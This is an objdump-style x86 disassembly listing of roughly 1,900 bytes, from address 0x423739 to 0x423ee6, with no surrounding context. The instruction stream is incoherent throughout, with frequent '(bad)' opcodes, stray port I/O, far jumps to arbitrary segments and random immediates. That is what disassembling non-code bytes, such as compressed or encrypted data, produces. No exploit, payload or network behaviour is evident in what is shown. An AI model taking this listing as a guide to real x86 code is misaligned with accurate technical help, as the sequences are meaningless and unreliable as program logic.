  423739:	rcl    al,1
  42373b:	push   eax
  42373c:	data16 das 
  42373e:	es scas eax,DWORD PTR es:[edi]
  423740:	out    0x1a,al
  423742:	sub    al,0x2c
  423744:	add    BYTE PTR fs:[esi+esi*2+0x5b],ah
  423749:	pusha  
  42374a:	cmp    esp,DWORD PTR [eax-0x5f]
  42374d:	popa   
  42374e:	(bad)  
  423750:	popf   
  423751:	pop    ds
  423752:	cmp    ah,dh
  423754:	add    BYTE PTR [eax-0x574019ba],ch
  42375a:	stc    
  42375b:	xchg   dl,dl
  42375d:	add    dh,dl
  42375f:	pop    ecx
  423760:	out    dx,eax
  423761:	(bad)  
  423762:	jmp    0x423764
  423764:	or     ecx,DWORD PTR [ecx+0x748700]
  42376a:	mov    al,BYTE PTR ss:[edx+0x402c082e]
  423771:	dec    esi
  423772:	mov    ebp,0x50da5522
  423777:	mov    ah,0x3e
  423779:	sbb    al,0xf9
  42377b:	adc    BYTE PTR [edx-0x640193c],al
  423781:	pop    ss
  423782:	(bad)  
  423783:	sar    BYTE PTR [esi],1
  423785:	add    BYTE PTR [edx+0xb4b00b9],dh
  42378b:	sbb    eax,0x757700
  423790:	call   DWORD PTR [eax-0x197ae00]
  423796:	sbb    ebx,edx
  423798:	inc    ebp
  423799:	lods   al,BYTE PTR ds:[esi]
  42379a:	lods   al,BYTE PTR ds:[esi]
  42379b:	cmp    esi,esp
  42379d:	cdq    
  42379e:	add    BYTE PTR [edx-0x1c],bl
  4237a1:	add    ch,ah
  4237a3:	out    0x0,eax
  4237a5:	pavgb  mm7,QWORD PTR [esi]
  4237a8:	int    0x15
  4237aa:	test   al,0x3a
  4237ac:	retf   
  4237ad:	(bad)  
  4237ae:	cmc    
  4237af:	add    BYTE PTR [edi+0x3f],ah
  4237b2:	mov    ds:0xb9a187ac,eax
  4237b7:	jns    0x423836
  4237b9:	jge    0x4237bb
  4237bb:	cmc    
  4237bc:	mov    esp,0xdce860e4
  4237c1:	sub    al,0x7a
  4237c3:	aaa    
  4237c4:	cmp    al,BYTE PTR [eax]
  4237c6:	cld    
  4237c7:	(bad)  
  4237c8:	hlt    
  4237c9:	push   es
  4237ca:	lea    eax,[eax]
  4237cc:	xor    DWORD PTR [esi-0x1f54565d],0xffffffbf
  4237d3:	xor    al,BYTE PTR [ebx+0x7c]
  4237d6:	mov    cl,ah
  4237d8:	lahf   
  4237d9:	hlt    
  4237da:	mov    cs:0x1445451d,al
  4237e0:	adc    esi,edi
  4237e2:	xchg   edx,eax
  4237e3:	dec    esi
  4237e4:	sub    eax,0x45b226af
  4237e9:	inc    ebp
  4237ea:	mov    dl,BYTE PTR [esi+0x40]
  4237ed:	and    BYTE PTR [ecx],cl
  4237ef:	fisub  DWORD PTR [esi-0x6b]
  4237f2:	xor    al,0x6a
  4237f4:	sub    esi,DWORD PTR [edx-0x53]
  4237f7:	scas   al,BYTE PTR es:[edi]
  4237f8:	and    BYTE PTR [edx-0x14],dh
  4237fb:	pop    esp
  4237fc:	arpl   sp,bx
  4237fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237ff:	addr16 pop edx
  423801:	add    eax,0xd04ea0ac
  423806:	sub    ch,BYTE PTR ds:0x40f3fe46
  42380c:	mov    esi,DWORD PTR [edi]
  42380e:	mov    bl,0xa3
  423810:	sbb    DWORD PTR [edx],esi
  423812:	xor    al,0x34
  423814:	pusha  
  423815:	or     al,0x4e
  423817:	mov    dl,0xbb
  423819:	jnp    0x42381b
  42381b:	neg    bl
  42381d:	rol    BYTE PTR [edx+0x587cc3c],0x6e
  423824:	ret    0x1c83
  423827:	jmp    0xff7c:0x560db068
  42382e:	adc    dh,bh
  423830:	jo     0x4237c8
  423832:	shr    BYTE PTR [eax+esi*1+0x6d],0x28
  423837:	(bad)  
  423838:	je     0x42389c
  42383a:	retf   0x2e28
  42383d:	add    bl,cl
  42383f:	sub    al,0xaa
  423841:	push   0x1aaa32e8
  423846:	xchg   esp,eax
  423847:	out    0x60,al
  423849:	xchg   esp,eax
  42384a:	xchg   ecx,eax
  42384b:	sub    BYTE PTR [edx+0x64e62b68],0x94
  423852:	lahf   
  423853:	sbb    BYTE PTR [ebp+edi*8+0x78],bl
  423857:	push   edi
  423858:	pop    ebx
  423859:	gs stos BYTE PTR es:[edi],al
  42385b:	dec    BYTE PTR [esi]
  42385d:	inc    esi
  42385e:	add    BYTE PTR [edi-0x1ed2bf56],dh
  423864:	jmp    0xaead8bb
  423869:	dec    edx
  42386a:	repz (bad) 
  42386c:	sbb    cl,bh
  42386e:	xchg   ecx,eax
  42386f:	stc    
  423870:	pop    ss
  423871:	mov    ebp,0xfa003823
  423876:	(bad)  
  423877:	test   DWORD PTR [eax+eax*1],0x8100e584
  42387e:	inc    ecx
  42387f:	in     al,dx
  423880:	jg     0x4238d3
  423882:	push   edi
  423883:	inc    ecx
  423884:	mov    ebp,0x88bc5fd2
  423889:	(bad)  
  42388a:	xchg   esp,eax
  42388b:	repnz add dh,dh
  42388e:	adc    eax,0x6ff30f00
  423893:	(bad)  
  423894:	fwait
  423895:	iret   
  423896:	ret    0x2b00
  423899:	test   eax,0x54c300
  42389e:	push   ss
  42389f:	es pusha 
  4238a1:	add    BYTE PTR [eax-0x73],ah
  4238a4:	add    BYTE PTR [ebp-0x320199a3],bl
  4238aa:	jg     0x4238f8
  4238ac:	add    BYTE PTR [ecx-0x1d88ffe5],bl
  4238b2:	add    BYTE PTR [ebp+esi*4+0x3dd200de],ah
  4238b9:	add    BYTE PTR [ebx],ch
  4238bb:	jmp    0x423899
  4238bd:	jmp    DWORD PTR [edx-0x4be87d72]
  4238c3:	jecxz  0x4238bb
  4238c5:	xor    bh,dh
  4238c7:	sub    BYTE PTR [eax+eax*1+0x4c],cl
  4238cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238cc:	add    BYTE PTR [ecx+0x5693a079],bh
  4238d2:	xor    edi,DWORD PTR [eax+0x42fef285]
  4238d8:	inc    ecx
  4238d9:	inc    ebx
  4238da:	xchg   ecx,eax
  4238db:	pop    edx
  4238dc:	xchg   dl,ch
  4238de:	push   esi
  4238df:	mov    esi,0xa2a247ae
  4238e4:	mov    fs,WORD PTR [esi-0x2]
  4238e7:	sub    BYTE PTR [ebx-0x2e],dh
  4238ea:	mov    ds:0x82fe4e86,eax
  4238ef:	stos   BYTE PTR es:[edi],al
  4238f0:	xor    eax,0x58a846d8
  4238f5:	sahf   
  4238f6:	aad    0x70
  4238f8:	push   esi
  4238f9:	jmp    0x3756:0x12a1a8bf
  423900:	out    0xdc,al
  423902:	inc    ah
  423904:	add    BYTE PTR es:[edx-0x295dff33],bl
  42390b:	add    al,0xcd
  42390d:	arpl   WORD PTR [ebx],sp
  42390f:	or     bl,BYTE PTR [esi]
  423911:	fadd   QWORD PTR [ebx+0x61fe6a46]
  423917:	dec    BYTE PTR [ebx-0x29]
  42391a:	popa   
  42391b:	xchg   esp,eax
  42391c:	inc    BYTE PTR [ebp-0x5d]
  42391f:	add    ch,cl
  423921:	iret   
  423922:	add    BYTE PTR [edi],bl
  423924:	ss xor eax,0x8e51545f
  42392a:	out    0xa6,al
  42392c:	xchg   BYTE PTR [esi+0x3f7f],dh
  423932:	pop    ebx
  423933:	cmp    DWORD PTR [edx],ecx
  423935:	mov    edx,0xc464ac8a
  42393a:	sbb    al,0xfe
  42393c:	test   BYTE PTR [eax+esi*8-0x7b07f228],bh
  423943:	out    0xb,al
  423945:	ror    BYTE PTR [esi-0x54d6ff3d],0x52
  42394c:	(bad)  
  42394d:	and    al,0x6e
  42394f:	xchg   dh,dl
  423951:	sbb    al,BYTE PTR [eax+eiz*4]
  423954:	sahf   
  423955:	fwait
  423956:	dec    esp
  423957:	sbb    al,0x40
  423959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42395a:	sub    al,0xc3
  42395c:	fisub  DWORD PTR [edx]
  42395e:	xlat   BYTE PTR ds:[ebx]
  42395f:	inc    ebx
  423960:	loopne 0x423924
  423962:	(bad)  
  423963:	mov    dh,0xdc
  423965:	fadd   QWORD PTR ds:0xb0cd4546
  42396b:	mov    ds:0x153caa9c,eax
  423970:	xchg   edi,eax
  423971:	es inc esi
  423973:	xor    dh,bh
  423975:	aas    
  423976:	retf   0x6b2e
  423979:	dec    BYTE PTR [edx+0x0]
  42397c:	dec    esi
  42397d:	xchg   ebp,eax
  42397e:	add    BYTE PTR [edi-0x10b8089],dh
  423984:	arpl   sp,di
  423986:	mov    gs,WORD PTR [ebp+0x56bf86b5]
  42398c:	mov    eax,0xc6584516
  423991:	(bad)  
  423992:	jno    0x423a07
  423994:	jle    0x4239fe
  423996:	inc    BYTE PTR [ebp+0x45]
  423999:	xchg   BYTE PTR [esi+edi*8+0x54],cl
  42399d:	mov    dh,0x0
  42399f:	sub    dl,BYTE PTR [ecx-0x616c2d00]
  4239a5:	loope  0x4239b0
  4239a7:	sbb    eax,DWORD PTR [eax+eax*2]
  4239aa:	out    0x27,al
  4239ac:	sbb    dh,bh
  4239ae:	idiv   DWORD PTR [esi-0x1564bbe]
  4239b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239b5:	fs popa 
  4239b7:	and    esi,edi
  4239b9:	inc    eax
  4239ba:	pop    ebp
  4239bb:	pop    edi
  4239bc:	add    BYTE PTR [ebx+0x5fe605a6],bl
  4239c2:	fs (bad) 
  4239c4:	addr16 xchg edx,eax
  4239c6:	add    BYTE PTR [esi],dl
  4239c8:	push   ecx
  4239c9:	add    bh,ch
  4239cb:	scas   eax,DWORD PTR es:[edi]
  4239cc:	push   ds
  4239cd:	retf   
  4239ce:	ss das 
  4239d0:	push   0x45
  4239d2:	es sysenter 
  4239d5:	idiv   dh
  4239d7:	out    0x0,al
  4239d9:	add    BYTE PTR [eax-0x4032c283],al
  4239df:	stc    
  4239e0:	outs   dx,DWORD PTR ds:[esi]
  4239e1:	and    al,0x0
  4239e3:	mov    ecx,0xc27b003b
  4239e8:	add    BYTE PTR [edx+edi*4+0x31f200fe],al
  4239ef:	add    BYTE PTR [ebx],cl
  4239f1:	retf   
  4239f2:	fstp   QWORD PTR [edx+0xff37f9]
  4239f8:	aaa    
  4239f9:	mov    ch,0x0
  4239fb:	out    0x50,eax
  4239fd:	add    BYTE PTR [edx],dl
  4239ff:	add    eax,0xa16c006c
  423a04:	add    BYTE PTR [ecx-0x35ae3a7],bl
  423a0a:	mov    ebx,DWORD PTR [edx]
  423a0c:	mov    ah,BYTE PTR [eax]
  423a0e:	imul   esp,esi,0xffffffa0
  423a11:	(bad)  
  423a12:	mov    eax,0x11de00da
  423a17:	add    BYTE PTR [edi],ah
  423a19:	out    0x45,eax
  423a1b:	lods   eax,DWORD PTR ds:[esi]
  423a1c:	rcl    ah,0xee
  423a1f:	or     cl,BYTE PTR [edi+ebx*8]
  423a22:	inc    esi
  423a23:	cs (bad) 
  423a25:	cmp    esi,DWORD PTR [esi+0x48fe6ff9]
  423a2b:	add    BYTE PTR [eax-0x7f],cl
  423a2e:	add    BYTE PTR [ebp-0x7efff78b],dh
  423a34:	add    eax,DWORD PTR [eax]
  423a36:	test   eax,0x92bc00fa
  423a3b:	(bad)  
  423a3c:	lods   al,BYTE PTR ds:[esi]
  423a3d:	adc    eax,0xc8456f35
  423a42:	inc    ebx
  423a43:	sbb    al,0xc4
  423a45:	pop    ds
  423a46:	add    BYTE PTR [edi+0x59],bh
  423a49:	xchg   BYTE PTR [edx-0x1a],cl
  423a4c:	mov    edi,0x47fe17f9
  423a51:	mov    ah,0x0
  423a53:	xor    al,0x9f
  423a55:	add    cl,dl
  423a57:	xchg   ecx,eax
  423a58:	mov    eax,0xefed00
  423a5d:	fst    DWORD PTR [esi]
  423a5f:	add    al,bl
  423a61:	lods   eax,DWORD PTR ds:[esi]
  423a62:	mov    ds:0xe6cdaeb5,eax
  423a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a68:	push   edx
  423a69:	pop    edi
  423a6a:	dec    esp
  423a6b:	loopne 0x423a0f
  423a6d:	pop    ebx
  423a6e:	fsubr  QWORD PTR [ecx-0x4]
  423a71:	int    0x7f
  423a73:	mov    BYTE PTR [esi+edi*8+0x10009072],ah
  423a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a7b:	add    ch,ch
  423a7d:	mov    cl,0x0
  423a7f:	leave  
  423a80:	retf   
  423a81:	add    cl,bh
  423a83:	xor    bl,BYTE PTR [esi+0x50]
  423a86:	aad    0xf1
  423a88:	in     eax,dx
  423a89:	scas   al,BYTE PTR es:[edi]
  423a8a:	or     BYTE PTR [esi+0x7b],0x6c
  423a8e:	cld    
  423a8f:	add    DWORD PTR [eax],eax
  423a91:	inc    edi
  423a92:	push   esp
  423a93:	fmul   DWORD PTR [ebx]
  423a95:	ins    BYTE PTR es:[edi],dx
  423a96:	mov    eax,eax
  423a98:	(bad)  
  423a99:	xchg   esp,eax
  423a9a:	cld    
  423a9b:	sbb    al,0x34
  423a9d:	or     ebx,esi
  423a9f:	(bad)  
  423aa0:	push   ss
  423aa1:	adc    al,0xc0
  423aa3:	mov    dh,BYTE PTR [esi]
  423aa5:	xor    eax,0x704e10b7
  423aaa:	rol    DWORD PTR [eax],1
  423aac:	sbb    DWORD PTR [edx+0x36],ebp
  423aaf:	mov    ah,0xaa
  423ab1:	and    al,BYTE PTR [edx]
  423ab3:	xchg   edi,eax
  423ab4:	cld    
  423ab5:	sbb    BYTE PTR [eax-0x5d],al
  423ab8:	sub    al,0x99
  423aba:	fsub   QWORD PTR [esi-0x1de121a]
  423ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ac1:	fcomp  st(4)
  423ac3:	out    0x0,eax
  423ac5:	and    eax,0x2f46ece5
  423aca:	js     0x423a54
  423acc:	or     eax,0xfe6a2980
  423ad1:	push   ecx
  423ad2:	push   esi
  423ad3:	xor    BYTE PTR [ecx+0x0],dl
  423ad6:	mov    bl,0x73
  423ad8:	mov    esp,0xd232ada0
  423add:	(bad)  
  423ade:	or     eax,0x7b6cf846
  423ae3:	add    BYTE PTR [esi-0x5d43273c],ah
  423ae9:	rcr    DWORD PTR [esi+0xfc21041],0x0
  423af0:	jge    0x423b4d
  423af2:	xchg   BYTE PTR [eax+ebp*1+0x9c02f30],al
  423af9:	add    BYTE PTR [eax-0x4e],al
  423afc:	jb     0x423acd
  423afe:	inc    BYTE PTR [ebx-0x55]
  423b01:	push   0xffffff9b
  423b03:	sub    bl,ch
  423b05:	jmp    0x983e4f1a
  423b0a:	inc    eax
  423b0b:	and    BYTE PTR [ecx+edi*2],ch
  423b0e:	inc    ebp
  423b0f:	cmp    DWORD PTR [ecx+0x1],0x0
  423b13:	pop    ebp
  423b14:	sbb    eax,0x7bd059bc
  423b19:	mov    ds:0x1de66400,al
  423b1e:	mov    dh,0xa2
  423b20:	jno    0x423b56
  423b22:	adc    dh,BYTE PTR [ecx-0x5f93f3ba]
  423b28:	add    bh,dl
  423b2a:	inc    edi
  423b2b:	cmp    DWORD PTR [ecx-0x3d],0xb3bc30e7
  423b32:	add    dh,ch
  423b34:	or     al,0x12
  423b36:	jns    0x423b98
  423b38:	mov    ss,WORD PTR [eax-0x4f]
  423b3b:	jns    0x423b37
  423b3d:	and    eax,0xbe6b4500
  423b42:	adc    BYTE PTR [ecx+0x1e],al
  423b45:	dec    BYTE PTR [edx+0x5a0b442a]
  423b4b:	pop    es
  423b4c:	(bad)  
  423b4d:	(bad)  
  423b4e:	lods   al,BYTE PTR ds:[esi]
  423b4f:	xor    edi,DWORD PTR [esi]
  423b51:	std    
  423b52:	mov    ebx,0x4e0a1a0a
  423b57:	aaa    
  423b58:	mov    eax,fs
  423b5a:	nop
  423b5b:	sub    edi,DWORD PTR [ebx+edi*8-0x64b3e532]
  423b62:	pop    esp
  423b63:	mov    dh,0x70
  423b65:	test   dl,0x64
  423b68:	in     al,dx
  423b69:	icebp  
  423b6a:	adc    DWORD PTR [esi+0x2716d456],eax
  423b70:	in     al,dx
  423b71:	int3   
  423b72:	lods   al,BYTE PTR ds:[esi]
  423b73:	sbb    ebx,DWORD PTR [edx+esi*1-0x1]
  423b77:	xchg   BYTE PTR [edx-0x42],al
  423b7a:	es (bad) 
  423b7c:	adc    al,0x50
  423b7e:	add    BYTE PTR [eax+0x22],dl
  423b81:	add    BYTE PTR [ebp-0x6ca52993],ch
  423b87:	lods   eax,DWORD PTR ds:[esi]
  423b88:	mov    edx,0x76a60b89
  423b8d:	mov    ah,0x70
  423b8f:	lods   al,BYTE PTR ds:[esi]
  423b90:	dec    esp
  423b91:	ret    0xbcac
  423b94:	push   0xfffffff3
  423b96:	scas   al,BYTE PTR es:[edi]
  423b97:	cmp    ebp,esp
  423b99:	mov    esp,0x60700e3
  423b9e:	sbb    BYTE PTR [ebx+eax*1-0x4f43b100],0x40
  423ba6:	mov    al,0xc2
  423ba8:	retf   0x89c9
  423bab:	int3   
  423bac:	js     0x423ba3
  423bae:	neg    DWORD PTR [eax+0x60]
  423bb1:	pop    esi
  423bb2:	aad    0x4a
  423bb4:	push   cs
  423bb5:	lock xchg ecx,eax
  423bb7:	add    ch,bh
  423bb9:	sub    dh,al
  423bbb:	push   edi
  423bbc:	pop    ss
  423bbd:	xchg   BYTE PTR [esi-0x75df9faa],ah
  423bc3:	arpl   WORD PTR [esi-0x1a1efe2],di
  423bc9:	jmp    0x423b73
  423bcb:	xor    bh,bh
  423bcd:	jo     0x423b67
  423bcf:	add    BYTE PTR [eax],bl
  423bd1:	loop   0x423bd3
  423bd3:	in     eax,0xa5
  423bd5:	inc    edx
  423bd6:	rol    DWORD PTR [eax],1
  423bd8:	stos   BYTE PTR es:[edi],al
  423bd9:	inc    esi
  423bda:	aam    0xda
  423bdc:	outs   dx,BYTE PTR ds:[esi]
  423bdd:	inc    ebx
  423bde:	in     al,dx
  423bdf:	(bad)  
  423be0:	hlt    
  423be1:	push   ss
  423be2:	gs jae 0x423c18
  423be5:	adc    BYTE PTR [ecx],bh
  423be7:	xchg   esp,eax
  423be8:	dec    ebp
  423be9:	int3   
  423bea:	mov    edi,0x7076c2a1
  423bef:	jp     0x423bef
  423bf1:	jo     0x423b77
  423bf3:	add    BYTE PTR [edx+eax*4],al
  423bf6:	add    BYTE PTR [ecx],al
  423bf8:	sar    DWORD PTR [eax+eax*1+0x3d00ab4d],0xbf
  423c00:	loop   0x423c48
  423c02:	inc    eax
  423c03:	leave  
  423c04:	add    BYTE PTR [ebp+0x72],dh
  423c07:	call   0x4f8f:0x46cd86ff
  423c0e:	(bad)  
  423c0f:	jge    0x423c11
  423c11:	stos   DWORD PTR es:[edi],eax
  423c12:	sub    DWORD PTR [eax],eax
  423c14:	out    0xd4,eax
  423c16:	add    BYTE PTR [esi-0x55ecfd51],dl
  423c1c:	mov    ah,dh
  423c1e:	loopne 0x423bb6
  423c20:	sbb    eax,0x86ff66fe
  423c25:	and    BYTE PTR [edx+0x5a535019],0x24
  423c2c:	(bad)  
  423c2d:	cmp    al,0x5e
  423c2f:	add    BYTE PTR [edx+0x19],dl
  423c32:	add    BYTE PTR [ebx-0x3201995],ch
  423c38:	aaa    
  423c39:	data16 add BYTE PTR [edi-0xf20ffeb],dl
  423c40:	add    BYTE PTR [edx-0x33ff3373],dh
  423c46:	cdq    
  423c47:	add    BYTE PTR [ecx],bh
  423c49:	stc    
  423c4a:	outs   dx,DWORD PTR ds:[esi]
  423c4b:	xor    BYTE PTR [ebp+edx*2+0x528705ae],dh
  423c52:	jle    0x423c34
  423c54:	(bad)  
  423c55:	push   ecx
  423c56:	mov    edx,0xa6863e00
  423c5b:	and    dh,bl
  423c5d:	jmp    0x98ca0362
  423c62:	repz dec esp
  423c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c65:	xchg   BYTE PTR [edx-0x31285553],ah
  423c6b:	(bad)  
  423c6c:	jmp    FWORD PTR [eax-0x298faa34]
  423c72:	sbb    ah,dh
  423c74:	neg    BYTE PTR [ecx]
  423c76:	fwait
  423c77:	jmp    DWORD PTR [ebx+0x0]
  423c7a:	xor    ebx,DWORD PTR [edx+0x1d5c00]
  423c80:	jno    0x423c9c
  423c82:	leave  
  423c83:	(bad)  
  423c84:	fs mov ebx,0x437f9ba0
  423c8a:	imul   ebx,esp,0xffffff8f
  423c8d:	inc    esi
  423c8e:	jmp    0x4994:0x14e7fe
  423c95:	add    BYTE PTR [ecx+0x31],dh
  423c98:	and    al,0x0
  423c9a:	inc    esp
  423c9b:	rep outs dx,DWORD PTR ds:[esi]
  423c9d:	dec    BYTE PTR [ebp+0x4f]
  423ca0:	add    BYTE PTR [ebx],dl
  423ca2:	mov    dh,0x0
  423ca4:	js     0x423cea
  423ca6:	add    BYTE PTR [eax],0x6
  423ca9:	fld    DWORD PTR [eax]
  423cab:	(bad)  
  423cac:	mov    edi,0xf3734fbe
  423cb1:	cmp    al,0xfe
  423cb3:	push   cs
  423cb4:	inc    ebp
  423cb5:	and    al,0x42
  423cb7:	add    BYTE PTR [eax+edi*2+0x6e69f39a],cl
  423cbe:	sahf   
  423cbf:	shr    DWORD PTR [edi-0x32e5ff22],cl
  423cc5:	es popa 
  423cc7:	jns    0x423d07
  423cc9:	int    0xcd
  423ccb:	aaa    
  423ccc:	bound  eax,QWORD PTR [eax]
  423cce:	test   al,0x70
  423cd0:	stos   BYTE PTR es:[edi],al
  423cd1:	out    dx,eax
  423cd2:	test   al,0x73
  423cd4:	repz cmp al,0xb9
  423cd7:	test   BYTE PTR [eax],0x36
  423cda:	ds jge 0x423d1c
  423cdd:	xchg   edi,eax
  423cde:	add    ah,al
  423ce0:	imul   ebp,DWORD PTR [esi-0x62],0xbd9bb4f
  423ce7:	fiadd  WORD PTR [ebx]
  423ce9:	add    BYTE PTR [edx+0x1a],dl
  423cec:	pop    edi
  423ced:	pusha  
  423cee:	shl    ebx,1
  423cf0:	dec    ecx
  423cf1:	cdq    
  423cf2:	pop    edx
  423cf3:	out    0x24,al
  423cf5:	(bad)  
  423cf6:	(bad)  
  423cf7:	bound  ebx,QWORD PTR [edx+0x7f3ff300]
  423cfd:	repz fstp st(7)
  423d00:	add    cl,ch
  423d02:	test   eax,0x12fc00
  423d07:	xchg   esi,eax
  423d08:	and    esi,eax
  423d0a:	and    al,BYTE PTR [eax]
  423d0c:	dec    ebx
  423d0d:	dec    ecx
  423d0e:	add    BYTE PTR [ecx+0x10],bh
  423d11:	lods   eax,DWORD PTR ds:[esi]
  423d12:	cmp    eax,0x6200377f
  423d17:	add    BYTE PTR [eax],0x0
  423d1a:	mov    bh,0x7e
  423d1c:	retf   0xac39
  423d1f:	or     DWORD PTR [edx-0x2f2f2f],ebp
  423d25:	jns    0x423d7d
  423d27:	jb     0x423cf7
  423d29:	mov    dh,bh
  423d2b:	ja     0x423d95
  423d2d:	inc    BYTE PTR ds:0xe83538d6
  423d33:	js     0x423cc7
  423d35:	push   ebx
  423d36:	add    BYTE PTR [ebx+0x70ec00ec],dl
  423d3c:	fldenv [edx-0x53f97407]
  423d42:	out    0xa7,al
  423d44:	add    BYTE PTR [eax-0x1edfffa3],bh
  423d4a:	pop    edx
  423d4b:	inc    ecx
  423d4c:	xchg   ebp,eax
  423d4d:	jge    0x423ce2
  423d4f:	shr    BYTE PTR [edx-0x5c],1
  423d52:	add    BYTE PTR [bx+si],ch
  423d55:	inc    esi
  423d56:	inc    eax
  423d57:	nop
  423d58:	or     BYTE PTR [eax-0x28],bh
  423d5b:	cld    
  423d5c:	mov    ds:0x6fae7f,al
  423d61:	mov    ebp,0x50c800c8
  423d66:	mov    dh,0xf5
  423d68:	add    BYTE PTR [esi-0x67feff19],dh
  423d6e:	jns    0x423de9
  423d70:	sub    ebp,DWORD PTR [edx-0x29]
  423d73:	(bad)  
  423d74:	and    al,BYTE PTR [eax+0x3a]
  423d77:	mov    dh,0xc0
  423d79:	sbb    al,0x44
  423d7b:	lahf   
  423d7c:	add    bh,bh
  423d7e:	call   0xb:0x68be610b
  423d85:	retf   0xfe8b
  423d88:	nop
  423d89:	add    BYTE PTR [edx+0x1f],dl
  423d8c:	dec    edi
  423d8d:	jae    0x423d82
  423d8f:	jl     0x423d59
  423d91:	xchg   ebp,eax
  423d92:	and    eax,0xb2de0080
  423d97:	clc    
  423d98:	repz imul ebp,DWORD PTR [esi-0x62],0x30e425
  423da0:	ins    BYTE PTR es:[edi],dx
  423da1:	and    al,0x68
  423da3:	mov    bl,0x79
  423da5:	ds int 0xcd
  423da8:	jnp    0x423d4a
  423daa:	add    dl,bh
  423dac:	mov    eax,ds:0x371a4118
  423db1:	iret   
  423db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423db3:	mov    ecx,0x40880050
  423db8:	cwde   
  423db9:	iret   
  423dba:	lods   al,BYTE PTR ds:[esi]
  423dbb:	rol    BYTE PTR [eax],0x16
  423dbe:	out    0xe6,al
  423dc0:	stc    
  423dc1:	xor    al,0xa6
  423dc3:	cmp    ebx,DWORD PTR [ebp+0x33]
  423dc6:	inc    ebp
  423dc7:	add    BYTE PTR [ebx+edx*8+0x6b9f3cdc],ah
  423dce:	(bad)  
  423dcf:	jmp    0x423d76
  423dd1:	aad    0x0
  423dd3:	xor    bh,al
  423dd5:	jl     0x423d71
  423dd7:	fwait
  423dd8:	out    0x1b,eax
  423dda:	jns    0x423dfc
  423ddc:	pop    ebp
  423ddd:	add    al,al
  423ddf:	xchg   ecx,eax
  423de0:	out    0x7,eax
  423de2:	sahf   
  423de3:	dec    edi
  423de4:	jae    0x423dd9
  423de6:	lds    ebp,FWORD PTR ds:0x4b074e00
  423dec:	xchg   ebp,eax
  423ded:	data16 int 0xf3
  423df0:	imul   ebp,DWORD PTR [esi-0x7b],0x51e0dc00
  423df7:	and    edx,ebx
  423df9:	fwait
  423dfa:	mov    ecx,0xcd3e79
  423dff:	push   0x79b3c127
  423e04:	add    DWORD PTR [eax],eax
  423e06:	cli    
  423e07:	xor    al,0x37
  423e09:	iret   
  423e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e0b:	adc    DWORD PTR [eax+0x3d],0xf
  423e0f:	call   0x9fa8c214
  423e14:	out    0xe6,al
  423e16:	stc    
  423e17:	and    bh,cl
  423e19:	cmp    BYTE PTR [eax+0x0],0x16
  423e1d:	fld    TBYTE PTR [edi-0x2e5583a7]
  423e23:	and    ah,BYTE PTR es:[eax-0x14f89102]
  423e2a:	in     eax,0xf9
  423e2c:	xor    al,0x9f
  423e2e:	pop    edi
  423e2f:	add    BYTE PTR [edx],dh
  423e31:	call   FWORD PTR [ebp+esi*2+0x29f3cd45]
  423e38:	inc    esp
  423e39:	mov    esi,0x5eb92fe
  423e3e:	les    esp,FWORD PTR ds:0xcd3e79b9
  423e44:	add    BYTE PTR [esp+eax*1+0x7f],cl
  423e48:	xchg   ebx,eax
  423e49:	pop    ebx
  423e4a:	mov    ch,0x0
  423e4c:	fidiv  DWORD PTR [edi+esi*1]
  423e4f:	iret   
  423e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e51:	mov    cs,ebx
  423e53:	and    esi,edi
  423e55:	or     eax,0x9f3a6800
  423e5a:	out    0xe6,al
  423e5c:	stc    
  423e5d:	inc    edi
  423e5e:	scas   eax,DWORD PTR es:[edi]
  423e5f:	dec    esp
  423e60:	popf   
  423e61:	add    dh,dh
  423e63:	(bad)  
  423e64:	std    
  423e65:	cmp    eax,0x3cc3a8ff
  423e6a:	push   ds
  423e6b:	jle    0x423df1
  423e6d:	(bad)  
  423e6e:	pop    esp
  423e6f:	add    BYTE PTR [ecx-0x2e8aff0d],dh
  423e75:	or     cl,ah
  423e77:	aaa    
  423e78:	mov    ch,0xf7
  423e7a:	add    BYTE PTR [eax+0x51],dh
  423e7d:	outs   dx,DWORD PTR ss:[esi]
  423e7f:	and    ch,BYTE PTR [ebp-0x2f799bb0]
  423e85:	ss push 0xfffffff6
  423e88:	loopne 0x423eeb
  423e8a:	inc    esp
  423e8b:	pop    ebx
  423e8c:	aam    0xd1
  423e8e:	dec    edx
  423e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e90:	xor    BYTE PTR [edx+ebx*1-0x67],ah
  423e94:	fnclex 
  423e96:	sbb    al,0x79
  423e98:	jb     0x423e8d
  423e9a:	cmp    al,0xfe
  423e9c:	and    al,0xe5
  423e9e:	xchg   DWORD PTR [eax+eax*1+0x2c],ebp
  423ea2:	mov    ah,0x77
  423ea4:	test   eax,0x20e6953c
  423ea9:	add    al,0x4f
  423eab:	mov    esp,0x4f20cac9
  423eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423eb1:	je     0x423eca
  423eb3:	sub    al,0xec
  423eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423eb6:	rcl    BYTE PTR [esi+ebx*4-0x51],cl
  423eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ebb:	clc    
  423ebc:	pop    esp
  423ebd:	das    
  423ebe:	in     eax,0xa9
  423ec0:	xor    al,0x95
  423ec2:	adc    al,0x4a
  423ec4:	les    esi,FWORD PTR [eax+0x2a7cf38c]
  423eca:	dec    ebp
  423ecb:	shl    BYTE PTR [edx+edi*1],0x19
  423ecf:	retf   
  423ed0:	mov    eax,ds:0x734f9e6e
  423ed5:	pop    edi
  423ed6:	add    BYTE PTR [edx],dl
  423ed8:	leave  
  423ed9:	cdq    
  423eda:	push   ebp
  423edb:	add    dl,bl
  423edd:	add    BYTE PTR [ebp+ecx*8+0x4d69f3cd],bl
  423ee4:	sub    edi,esp
  423ee6:	mov    dl,0x67
